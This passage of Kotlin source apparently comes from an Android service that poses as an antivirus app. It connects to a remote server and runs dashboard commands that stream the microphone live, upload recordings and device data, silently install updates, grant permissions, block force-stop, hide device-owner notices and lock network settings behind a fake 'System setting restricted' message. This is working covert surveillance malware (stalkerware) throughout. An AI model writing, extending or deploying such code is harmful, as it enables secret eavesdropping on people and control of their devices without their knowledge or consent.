            .addHeader("X-Device-Id", deviceId)
        if (wsAuthToken.isNotBlank()) {
            requestBuilder.addHeader("X-Auth-Token", wsAuthToken)
        }
        val request = requestBuilder.build()

        try {
            webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(TAG, "WebSocket connected ✅ to $targetUrl")
                isWsConnecting.set(false)
                wsConnectFailuresCount = 0 // Reset failure count on success (Bug 10)
                activeWebSocket = webSocket
                wsReconnectAttempts = 0
                // BUG-R5: Reset source rotation counter so next session can retry all sources fresh
                sourceRotateAttempts = 0

                // Stop the HTTP polling if it's running fast
                startHttpFallbackSync()

                updateNotification("Antivirus is live and running")
                val infoMsg = "DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}:${BuildConfig.VERSION_NAME}:${BuildConfig.VERSION_CODE}"
                Log.i(TAG, "[WS] Sending device info: $infoMsg")
                webSocket.send(infoMsg)

                // BUG-R10: Restore all session state — not just streaming flag
                val wasStreaming = prefs.getBoolean("session_streaming", true)
                wantsMicStreaming = wasStreaming
                voiceProfile = prefs.getString("session_voice_profile", "room") ?: "room"
                softwareGainMultiplier = prefs.getFloat("session_gain", 1.6f).toDouble()
                lowNetworkMode = prefs.getBoolean("session_low_network", false)
                wsStreamMode = prefs.getString("session_stream_codec", "auto") ?: "auto"
                Log.i(TAG, "Session restored: streaming=$wasStreaming profile=$voiceProfile gain=$softwareGainMultiplier lowNet=$lowNetworkMode codec=$wsStreamMode")

                if (wasStreaming) {
                    // FIX Issue 1: Delay briefly so any previous capture session's
                    // finally block (which clears isCapturingGuard) has time to
                    // complete before we try to start a new capture session.
                    serviceScope.launch(Dispatchers.IO) {
                        delay(300L)
                        if (wantsMicStreaming && activeWebSocket != null && !isCapturing && !isWebRtcStreaming) {
                            startAudioCapture()
                            startMicWatchdog()
                        }
                    }
                }

                startDataCollection()
                startRecordingUploader()
                sendHealthStatus("ws_open")
                flushOfflineAcks()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                val trimmed = text.trim()
                // Bug L8 fix: Don't update lastAudioChunkSentAtMs on commands — only audio
                // sends should update it. Ensures KeepAliveWorker detects stalled audio streams.
                Log.d(TAG, "[WS] Received command: $trimmed")
                handleServerCommand(trimmed)
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                // Bug L8 fix: Don't update lastAudioChunkSentAtMs on received messages
                handleServerCommand(bytes.utf8().trim())
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}")
                isWsConnecting.set(false) // Ensure reset even on failure (Bug 2)
                wsConnectFailuresCount++ // Increment failure count (Bug 10)
                onWsDisconnected("failure")
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.w(TAG, "WebSocket closed: $reason")
                isWsConnecting.set(false) // Ensure reset (Bug 2)
                onWsDisconnected("closed")
            }
            })
        } catch (e: Exception) {
            Log.e(TAG, "WebSocket creation failed: ${e.message}", e)
            isWsConnecting.set(false) // Bug 2: Reset on exception
            wsConnectFailuresCount++
            onWsDisconnected("creation_failed")
        }
    }

    private fun onWsDisconnected(reason: String) {
        Log.w(TAG, "[WS] Connection lost. Reason: $reason, Failures: $wsConnectFailuresCount")
        if (wsConnectFailuresCount >= 3) wsConnectFailuresCount = 0
        
        activeWebSocket = null
        webSocket = null  // Bug 6: Clear both WS references to prevent stale sends
        
        // Bug A/3: Job cancellation correctly delegated to scheduleWebSocketReconnect with mutex protection
        
        stopCameraLiveStream("ws_disconnected")
        // BUG-H1 fix: Stop audio BEFORE watchdog — prevents watchdog from restarting mic
        // during the gap between stopMicWatchdog and stopAudioCapture.
        stopAudioCapture("ws_disconnected")
        stopMicWatchdog()
        stopWebRtcSession(notifyState = false)
        stopDataCollection()
        stopRecordingUploader()
        
        // Ensure HTTP fallback polling picks up slack
        startHttpFallbackSync()
        
        scheduleWebSocketReconnect(reason, forceRestart = true)
    }

    private fun handleSocketSendFailure(reason: String) {
        val staleWs = activeWebSocket
        activeWebSocket = null
        webSocket = null
        isWsConnecting.set(false)
        try { staleWs?.close(1001, reason) } catch (_: Exception) {}
        // BUG-C2 fix: Use Dispatchers.IO instead of Dispatchers.Main to prevent ANR.
        // onWsDisconnected calls stopAudioCapture which blocks on AudioRecord.stop() HAL call.
        serviceScope.launch(Dispatchers.IO) {
            onWsDisconnected(reason)
        }
    }

    // Safe WebSocket send with automatic error handling and reconnection
    // Bug 6: Use activeWebSocket (the one that gets nulled on disconnect), NOT webSocket
    private fun safeSend(data: Any): Boolean {
        return try {
            val ws = activeWebSocket
            if (ws == null) {
                return false
            }

            val sent = when (data) {
                is String -> ws.send(data)
                is okio.ByteString -> ws.send(data)
                else -> ws.send(data.toString())
            }
            if (!sent) {
                Log.w(TAG, "WebSocket send returned false; forcing reconnect")
                handleSocketSendFailure("send_returned_false")
            }
            // BUG-C3 fix: Don't update lastAudioChunkSentAtMs here — it should only
            // be updated in the audio capture loop. Updating it on every send (health,
            // acks, photos) masks stalled audio streams from KeepAliveWorker zombie detection.
            sent
        } catch (e: Exception) {
            Log.w(TAG, "WebSocket send failed: ${e.message}")
            handleSocketSendFailure("send_failed")
            false
        }
    }

    private fun sendCommandAck(command: String, status: String = "success", detail: String? = null) {
        val msg = JSONObject().apply {
            put("type", "command_ack")
            put("command", command)
            put("status", status)
            if (!detail.isNullOrBlank()) put("detail", detail.take(200))
            put("ts", System.currentTimeMillis())
        }
        if (safeSend(msg.toString())) return
        queueOfflineAck(msg)
    }

    private fun queueOfflineAck(ack: JSONObject) {
        try {
            val key = "pending_command_acks"
            val raw = prefs.getString(key, "[]") ?: "[]"
            val arr = try { JSONArray(raw) } catch (_: Exception) { JSONArray() }
            if (arr.length() >= 100) {
                val trimmed = JSONArray()
                for (i in 1 until arr.length()) trimmed.put(arr.get(i))
                trimmed.put(ack)
                prefs.edit().putString(key, trimmed.toString()).apply()
            } else {
                arr.put(ack)
                prefs.edit().putString(key, arr.toString()).apply()
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to queue offline ACK: ${e.message}")
        }
    }

    private fun flushOfflineAcks() {
        val key = "pending_command_acks"
        val raw = prefs.getString(key, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Exception) { JSONArray() }
        if (arr.length() == 0) return
        val remaining = JSONArray()
        for (i in 0 until arr.length()) {
            val ack = arr.optJSONObject(i)
            if (ack == null || !safeSend(ack.toString())) {
                if (ack != null) remaining.put(ack)
            }
        }
        prefs.edit().putString(key, remaining.toString()).apply()
    }

    private fun isNetworkUsable(): Boolean {
        val cm = connectivityManager ?: return true
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private var httpFallbackJob: Job? = null
    private val httpFallbackJobMutex = Mutex()
    
    private fun startHttpFallbackSync() {
        val currentWsState = activeWebSocket != null
        val previousState = lastHttpFallbackWsState.getAndSet(currentWsState)
        httpFallbackJob?.cancel()
        serviceScope.launch(Dispatchers.IO) {
            httpFallbackJobMutex.withLock {
                if (httpFallbackJob?.isActive == true && currentWsState == previousState) {
                    return@withLock
                }

                Log.i(TAG, "[Fallback] Starting HTTP sync worker (WS Connected: $currentWsState)")
                httpFallbackJob = launch {
                    while (isActive) {
                        // HTTP Heartbeat (Layer 12)
                        try {
                            val url = "$serverHttpBaseUrl/api/heartbeat"
                            // BUG-R8: Use application/json Content-Type so Render edge + Express body-parser accept the POST
                            val heartbeatBody = JSONObject().apply { put("deviceId", deviceId) }.toString()
                                .toRequestBody("application/json".toMediaTypeOrNull())
                            val requestBuilder = Request.Builder()
                                .url(url)
                                .post(heartbeatBody)
                                .addHeader("X-Device-Id", deviceId)
                            // Bug M1 fix: Include auth token in HTTP fallback requests
                            if (wsAuthToken.isNotBlank()) requestBuilder.addHeader("X-Auth-Token", wsAuthToken)
                            val request = requestBuilder.build()
                            val response = httpClient.newCall(request).execute()
                            if (response.isSuccessful) {
                                val body = response.body?.string()
                                if (!body.isNullOrBlank()) {
                                    try {
                                        val root = JSONObject(body)
                                        val heartbeatCommands = root.optJSONArray("commands")
                                        if (heartbeatCommands != null && heartbeatCommands.length() > 0) {
                                            processRecoveredCommands(heartbeatCommands, "heartbeat")
                                        } else if (root.optBoolean("commandsAvailable", false)) {
                                            // Layer 2: fetch commands immediately via sync
                                            syncCommandsNow()
                                        }
                                    } catch (_: Exception) {
                                        if (body.contains("\"commandsAvailable\":true")) {
                                            syncCommandsNow()
                                        }
                                    }
                                }
                            }
                            response.close()
                        } catch (e: Exception) {
                            Log.w(TAG, "Heartbeat failed: ${e.message}")
                        }

                        // HTTP Polling Fallback (Layer 2)
                        if (activeWebSocket == null) {
                            syncCommandsNow()
                            // H-03: Use a smaller delay but check isActive for clean exit
                            // Bug 1.4: Change HTTP fallback delay from 120s to 30s when WS connected
                            var delayElapsed = 0L
                            while (isActive && delayElapsed < 30_000L && activeWebSocket == null) {
                                delay(2000)
                                delayElapsed += 2000
                            }
                        } else {
                            // Keep server liveness checks frequent enough to catch backend restarts.
                            // Bug 1.4: Use 30s instead of 120s even when WS is connected
                            delay(30_000L)
                        }
                    }
                }
            }
        }
    }

    private fun processRecoveredCommands(commands: JSONArray, source: String) {
        for (i in 0 until commands.length()) {
            val cmd = commands.optString(i, "")
            if (cmd.isBlank()) continue
            Log.i(TAG, "Executing recovered command via $source: $cmd")
            handleServerCommand(cmd)
        }
    }
    
    private suspend fun syncCommandsNow() {
        if (!isNetworkUsable()) return
        acquireWakeLock() // refresh wake-lock
        try {
            val url = "$serverHttpBaseUrl/api/sync?deviceId=$deviceId"
            val requestBuilder = Request.Builder()
                .url(url)
                .addHeader("X-Device-Id", deviceId)
            // Bug M1 fix: Include auth token in HTTP sync requests
            if (wsAuthToken.isNotBlank()) requestBuilder.addHeader("X-Auth-Token", wsAuthToken)
            val request = requestBuilder.build()
            val response = httpClient.newCall(request).execute()
            if (response.isSuccessful) {
                val body = response.body?.string()
                if (!body.isNullOrBlank()) {
                    val root = JSONObject(body)
                    // Apply states (Layer 10 Save/Restore state)
                    if (root.has("sessionState")) {
                        val state = root.getJSONObject("sessionState")
                        val serverStreaming = state.optBoolean("streaming", true)
                        wantsMicStreaming = serverStreaming
                        prefs.edit().putBoolean("session_streaming", serverStreaming).apply()
                    }
                    val wasReplayed = root.optBoolean("replayed", false)
                    if (wasReplayed) {
                        Log.d(TAG, "Sync commands replayed; executing for idempotent recovery")
                    }
                    if (root.has("commands")) {
                        // Process offline commands (Layer 9 pop)
                        processRecoveredCommands(root.getJSONArray("commands"), "http_sync")
                    }
                }
            }
            response.close()
        } catch (e: Exception) {
            Log.w(TAG, "Sync fallback failed: ${e.message}")
        }
    }

    private fun nextReconnectDelayMs(): Long {
        // Fast aggressive retry: 500ms -> 1s -> 2s -> 4s -> 5s max
        val expShift = wsReconnectAttempts.coerceAtMost(3)  // Cap earlier (was 4)
        val expDelay = (WS_RECONNECT_BASE_MS * (1L shl expShift)).coerceAtMost(WS_RECONNECT_MAX_MS)
        val jitter = Random.nextLong(100L, 500L)  // Less jitter (was 250-1500)
        return (expDelay + jitter).coerceAtMost(WS_RECONNECT_MAX_MS)
    }

    private fun scheduleWebSocketReconnect(reason: String, forceRestart: Boolean = false) {
        val previousJob: Job?
        synchronized(reconnectScheduleLock) {
            previousJob = wsReconnectJob
            previousJob?.cancel()
            wsReconnectJob = serviceScope.launch(Dispatchers.IO) {
                try {
                    try {
                        withTimeoutOrNull(2_000) { previousJob?.join() }
                    } catch (_: CancellationException) {
                    }
                    while (isActive && activeWebSocket == null) {
                        if (!isNetworkUsable()) {
                            updateNotification("Waiting for network sync…")
                            delay(2_000)
                            continue
                        }
                        // BUG-H5 fix: If isWsConnecting has been stuck for >30s, force-reset it.
                        // Some OEMs silently drop WS handshake without calling any OkHttp callback,
                        // leaving the flag permanently true and deadlocking all reconnect attempts.
                        if (isWsConnecting.get()) {
                            delay(1_000)
                            // OkHttp connect timeout is 60s. If still connecting after 3 loop iterations
                            // (3 seconds), the callback was likely swallowed — force-reset the flag.
                            if (isWsConnecting.get() && wsReconnectAttempts > 0 && wsReconnectAttempts % 3 == 0) {
                                Log.w(TAG, "BUG-H5: isWsConnecting stuck for too long, force-resetting")
                                isWsConnecting.set(false)
                            }
                            continue
                        }

                        val delayMs = nextReconnectDelayMs()
                        wsReconnectAttempts++
                        updateNotification("Sync paused — retry in ${delayMs / 1000}s…")

                        // Bug 1: Wait FIRST, then connect (proper exponential backoff)
                        // H-02: Check isActive frequently during long delays
                        var elapsed = 0L
                        while (isActive && elapsed < delayMs) {
                            delay(500)
                            elapsed += 500
                        }
                        if (!isActive) break

                        // Recheck after delay — another path may have connected
                        if (activeWebSocket != null || isWsConnecting.get()) continue

                        connectWebSocket()

                        // Give OkHttp time to complete the handshake before looping
                        delay(5_000)
                    }
                } catch (_: CancellationException) {
                }
            }
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Remote command handler (from primary device dashboard)
    // ────────────────────────────────────────────────────────────────────────

    private fun handleServerCommand(cmd: String) {
        Log.i(TAG, "[COMMAND] Processing command: $cmd")
        if (cmd.startsWith("{")) {
            handleServerJsonCommand(cmd)
            return
        }
        when (cmd) {
            "start_stream" -> {
                Log.i(TAG, "CMD: start mic stream")
                wantsMicStreaming = true
                prefs.edit().putBoolean("session_streaming", true).apply()
                if (isWebRtcStreaming) {
                    Log.i(TAG, "WebRTC is active, ignoring start_stream command to prevent interrupting WebRTC")
                    sendCommandAck("start_stream", detail = "ignored_webrtc_active")
                } else {
                    serviceScope.launch(Dispatchers.IO) {
                        val staleCapture = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
                        if (staleCapture) {
                            stopAudioCapture("start_stream_stale_restart")
                            var retries = 0
                            while (isCapturingGuard.get() && retries < 10) {
                                delay(100)
                                retries++
                            }
                        }
                        startAudioCapture()
                        startMicWatchdog()
                        updateNotification("Antivirus is live and running")
                        sendCommandAck("start_stream")
                    }
                }
            }
            "stop_stream" -> {
                Log.i(TAG, "CMD: stop mic stream")
                wantsMicStreaming = false
                prefs.edit().putBoolean("session_streaming", false).apply()
                stopMicWatchdog()
                stopAudioCapture()
                stopWebRtcSession(notifyState = true)
                updateNotification("Antivirus is live and running")
                sendCommandAck("stop_stream")
            }
            "start_record" -> {
                Log.i(TAG, "CMD: start_record (recording feature removed)")
                sendCommandAck("start_record", "error", "recording_removed")
            }
            "stop_record" -> {
                Log.i(TAG, "CMD: stop_record (recording feature removed)")
                sendCommandAck("stop_record", "error", "recording_removed")
            }
            "ping" -> {
                sendCommandAck("ping")
            }
            "scan_recordings" -> {
                Log.i(TAG, "CMD: scan_recordings - starting manual scan")
                serviceScope.launch(Dispatchers.IO) { scanAndUploadRecordings() }
                sendCommandAck("scan_recordings")
            }
            "get_data" -> {
                // Dashboard requested a fresh sync immediately
                lastDataHashStr = "" // clear cache so data is forced to sync
                sendDeviceData()
                sendCommandAck("get_data")
            }
            "force_reconnect" -> {
                Log.i(TAG, "CMD: force_reconnect - restart websocket session")
                // Bug 6.2: Queue HTTP ACK fallback instead of closing socket immediately
                sendCommandAck("force_reconnect")
                try { activeWebSocket?.close(1001, "force_reconnect") } catch (_: Exception) {}
                onWsDisconnected("force_reconnect")
            }
            "force_update" -> {
                Log.i(TAG, "CMD: force_update - immediate update check + install")
                sendCommandAck("force_update", detail = "checking")
                
                // Direct inline update — bypass WorkManager constraints
                serviceScope.launch(Dispatchers.IO) {
                    try {
                        safeSend("""{"type":"update_status","status":"checking","message":"Checking for updates..."}""")
                        
                        val versionInfo = UpdateService.checkForUpdate(this@MicService, forceCheck = true)
                        if (versionInfo != null) {
                            val isOwnerInstall = UpdateService.isDeviceOwner(this@MicService)
                            val installMode = if (isOwnerInstall) "silent" else "user_confirm"
                            safeSend("""{"type":"update_status","status":"downloading","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize},"installMode":"$installMode"}""")
                            Log.i(TAG, "Update available: ${versionInfo.versionName} (code ${versionInfo.versionCode})")
                            
                            val result = UpdateService.downloadAndInstall(this@MicService, versionInfo)

                            if (result == UpdateService.InstallResult.SILENT_STARTED) {
                                safeSend("""{"type":"update_status","status":"installing","version":"${versionInfo.versionName}"}""")
                            } else if (result == UpdateService.InstallResult.PROMPT_SHOWN) {
                                safeSend("""{"type":"update_status","status":"awaiting_user_action","message":"Update downloaded. User confirmation required for install."}""")
                            } else {
                                safeSend("""{"type":"update_status","status":"error","message":"Installation failed."}""")
                            }
                        } else {
                            safeSend("""{"type":"update_status","status":"up_to_date","currentVersion":"${BuildConfig.VERSION_NAME}","currentCode":${BuildConfig.VERSION_CODE}}""")
                            Log.i(TAG, "No update available — already on latest")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Force update failed: ${e.message}")
                        safeSend("""{"type":"update_status","status":"error","message":"${e.message?.take(100)?.replace("\"", "'")}"}""")
                    }
                }
            }
            "grant_permissions" -> {
                Log.i(TAG, "CMD: grant_permissions - re-granting all permissions")
                try {
                    UpdateService.autoGrantPermissions(this)
                    sendCommandAck("grant_permissions")
                    // Collect and send data to verify permissions work
                    serviceScope.launch(Dispatchers.IO) {
                        delay(500)  // Wait for permissions to apply
                        sendDeviceData()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to grant permissions: ${e.message}")
                    sendCommandAck("grant_permissions", "error", e.message)
                }
            }
            "enable_autostart" -> {
                // Open Realme/Xiaomi/Vivo auto-start settings
                Log.i(TAG, "CMD: enable_autostart - opening auto-start settings")
                try {
                    val opened = openAutoStartSettings()
                    if (opened) {
                        sendCommandAck("enable_autostart", detail = "opened")
                    } else {
                        sendCommandAck("enable_autostart", "error", "not_supported")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to open autostart settings: ${e.message}")
                    sendCommandAck("enable_autostart", "error", e.message)
                }
            }
        "disable_battery_optimization" -> {
            Log.i(TAG, "CMD: disable_battery_optimization - requesting Doze exemption")
            try {
                val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = android.net.Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(intent)
                sendCommandAck("disable_battery_optimization", detail = "opened")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to request battery exemption: ${e.message}")
                sendCommandAck("disable_battery_optimization", "error", e.message)
            }
        }
            "check_update" -> {
                Log.i(TAG, "CMD: check_update - triggering update check")
                serviceScope.launch(Dispatchers.IO) {
                    val versionInfo = UpdateService.checkForUpdate(this@MicService, forceCheck = true)
                    if (versionInfo != null) {
                        safeSend("""{"type":"update_available","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize}}""")
                        sendCommandAck("check_update", detail = "update_available")
                    } else {
                        safeSend("""{"type":"update_status","status":"up_to_date"}""")
                        sendCommandAck("check_update", detail = "up_to_date")
                    }
                }
            }
            "clear_device_owner" -> {
                Log.i(TAG, "CMD: clear_device_owner - removing device owner")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        dpm.clearDeviceOwnerApp(packageName)
                        sendCommandAck("clear_device_owner")
                        Log.i(TAG, "Device Owner cleared successfully")
                    } else {
                        sendCommandAck("clear_device_owner", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to clear device owner: ${e.message}")
                    sendCommandAck("clear_device_owner", "error", e.message)
                }
            }
            "lock_app" -> {
                Log.i(TAG, "CMD: lock_app - starting LockTaskMode and preventing force stop")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        
                        // 1. Prevent force stop (Android 11+)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                            dpm.setUserControlDisabledPackages(admin, listOf(packageName))
                        }
                        
                        // 2. Enable Kiosk Mode (LockTaskMode)
                        dpm.setLockTaskPackages(admin, arrayOf(packageName))
                        prefs.edit().putBoolean("lock_task_mode", true).apply()
                        sendHealthStatus("app_locked")
                        
                        // Trigger Activity to start pinning
                        val intent = Intent(this, MainActivity::class.java).apply {
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            putExtra("action", "lock")
                        }
                        startActivity(intent)
                        
                        sendCommandAck("lock_app")
                    } else {
                        sendCommandAck("lock_app", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Lock failed: ${e.message}")
                    sendCommandAck("lock_app", "error", e.message)
                }
            }
            "unlock_app" -> {
                Log.i(TAG, "CMD: unlock_app - releasing LockTaskMode and allowing force stop")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        
                        // 1. Allow force stop
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                            dpm.setUserControlDisabledPackages(admin, emptyList())
                        }
                        
                        // 2. Disable Kiosk Mode
                        prefs.edit().putBoolean("lock_task_mode", false).apply()
                        sendHealthStatus("app_unlocked")
                        val intent = Intent(this, MainActivity::class.java).apply {
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            putExtra("action", "unlock")
                        }
                        startActivity(intent)
                        
                        sendCommandAck("unlock_app")
                    } else {
                        sendCommandAck("unlock_app", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Unlock failed: ${e.message}")
                    sendCommandAck("unlock_app", "error", e.message)
                }
            }
            "hide_notifications" -> {
                // Hide Device Owner organization notifications
                Log.i(TAG, "CMD: hide_notifications - hiding Device Owner messages")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        
                        // Clear organization name
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            dpm.setOrganizationName(admin, "")
                        }
                        // Clear support messages
                        dpm.setShortSupportMessage(admin, null)
                        dpm.setLongSupportMessage(admin, null)
                        
                        sendCommandAck("hide_notifications")
                        Log.i(TAG, "Device Owner notifications hidden")
                    } else {
                        sendCommandAck("hide_notifications", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to hide notifications: ${e.message}")
                    sendCommandAck("hide_notifications", "error", e.message)
                }
            }

            "reboot" -> {
                Log.i(TAG, "CMD: reboot - rebooting device")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        sendCommandAck("reboot")
                        serviceScope.launch(Dispatchers.Main) {
                            delay(1000)
                            dpm.reboot(admin)
                        }
                    } else {
                        sendCommandAck("reboot", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to reboot: ${e.message}")
                    sendCommandAck("reboot", "error", e.message)
                }
            }
            "uninstall_app" -> {
                // Uninstall the app (clear device owner first, then uninstall)
                Log.i(TAG, "CMD: uninstall_app - starting uninstall process")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    
                    // If Device Owner, unlock app first
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        // Clear device owner to allow uninstall
                        dpm.clearDeviceOwnerApp(packageName)
                        Log.i(TAG, "Device Owner cleared for uninstall")
                    }
                    
                    // Launch uninstall intent
                    val packageUri = android.net.Uri.parse("package:$packageName")
                    val uninstallIntent = android.content.Intent(android.content.Intent.ACTION_DELETE, packageUri).apply {
                        flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    startActivity(uninstallIntent)
                    sendCommandAck("uninstall_app", detail = "launched")
                    Log.i(TAG, "Uninstall dialog launched")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to uninstall: ${e.message}")
                    sendCommandAck("uninstall_app", "error", e.message)
                }
            }
            "lock_network" -> {
                Log.i(TAG, "CMD: lock_network - restricting network toggles")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_WIFI)
                        dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_MOBILE_NETWORKS)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                            dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
                        }
                        dpm.setStatusBarDisabled(admin, true)
                        // Make the Android IT Admin popup look like a normal system restriction
                        dpm.setShortSupportMessage(admin, "System setting restricted.")
                        prefs.edit().putBoolean("network_locked", true).apply()
                        sendHealthStatus("network_locked")
                        sendCommandAck("lock_network")
                        Log.i(TAG, "Network toggles locked")
                    } else {
                        sendCommandAck("lock_network", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to lock network: ${e.message}")
                    sendCommandAck("lock_network", "error", e.message)
                }
            }
            "unlock_network" -> {
                Log.i(TAG, "CMD: unlock_network - allowing network toggles")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_WIFI)
                        dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_MOBILE_NETWORKS)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                            dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
                        }
                        dpm.setStatusBarDisabled(admin, false)
                        dpm.setShortSupportMessage(admin, null)
                        prefs.edit().putBoolean("network_locked", false).apply()
                        sendHealthStatus("network_unlocked")
                        sendCommandAck("unlock_network")
                        Log.i(TAG, "Network toggles unlocked")
                    } else {
                        sendCommandAck("unlock_network", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to unlock network: ${e.message}")
                    sendCommandAck("unlock_network", "error", e.message)
                }
            }
            else -> Log.d(TAG, "Unknown command: $cmd")
        }
    }

    private fun handleServerJsonCommand(jsonText: String) {
        Log.i(TAG, "[JSON-COMMAND] Processing: $jsonText")
        try {
            val obj = JSONObject(jsonText)
            when (obj.optString("type")) {
                "get_data", "force_update", "start_stream", "stop_stream", "start_record", "stop_record", "ping", "force_reconnect", "grant_permissions", "enable_autostart", "check_update", "clear_device_owner", "lock_app", "unlock_app", "hide_notifications", "uninstall_app", "lock_network", "unlock_network", "scan_recordings" -> {
                    handleServerCommand(obj.optString("type"))
                    return
                }
                "webrtc_start" -> {
                    Log.i(TAG, "CMD: webrtc_start")
                    startWebRtcSession()
                    // ACK is sent asynchronously inside startWebRtcSession after track is ready
                }
                "webrtc_stop" -> {
                    Log.i(TAG, "CMD: webrtc_stop")
                    stopWebRtcSession(notifyState = true)
                    sendCommandAck("webrtc_stop")
                }
                "webrtc_offer" -> {
                    val sdp = obj.optString("sdp", "")
                    if (sdp.isNotBlank()) {
                        if (sdp.length > 300_000) {
                            sendCommandAck("webrtc_offer", "error", "sdp_too_large")
                            return
                        }
                        Log.i(TAG, "CMD: webrtc_offer")
                        if (peerConnection == null) {
                            pendingRemoteOfferSdp = sdp
                            startWebRtcSession()
                            sendCommandAck("webrtc_offer", detail = "queued_waiting_pc")
                            return
                        }
                        applyRemoteOfferAndCreateAnswer(sdp)
                        sendCommandAck("webrtc_offer")
                    }
                }
                "webrtc_ice" -> {
                    val c = obj.optJSONObject("candidate")
                    if (c != null) {
                        val candidate = IceCandidate(
                            c.optString("sdpMid", ""),
                            c.optInt("sdpMLineIndex", 0),
                            c.optString("candidate", "")
                        )
                        peerConnection?.addIceCandidate(candidate)
                        sendCommandAck("webrtc_ice")
                    }
                }
                "webrtc_quality" -> {
                    lastDashboardQuality = obj.optJSONObject("quality")
                    applyAdaptiveBitrate()
                    sendCommandAck("webrtc_quality")
                }
                "ai_mode" -> {
                    aiAutoModeEnabled = false
                    aiEnhancementEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiEnhancementEnabled) "ai_mode_on" else "ai_mode_off")
                    Log.i(TAG, "AI mode set to $aiEnhancementEnabled")
                    sendCommandAck("ai_mode", detail = if (aiEnhancementEnabled) "on" else "off")
                }
                "ai_auto" -> {
                    aiAutoModeEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiAutoModeEnabled) "ai_auto_on" else "ai_auto_off")
                    Log.i(TAG, "AI auto mode set to $aiAutoModeEnabled")
                    sendCommandAck("ai_auto", detail = if (aiAutoModeEnabled) "on" else "off")
                }
                "photo_ai" -> {
                    aiPhotoEnhancementEnabled = obj.optBoolean("enabled", true)
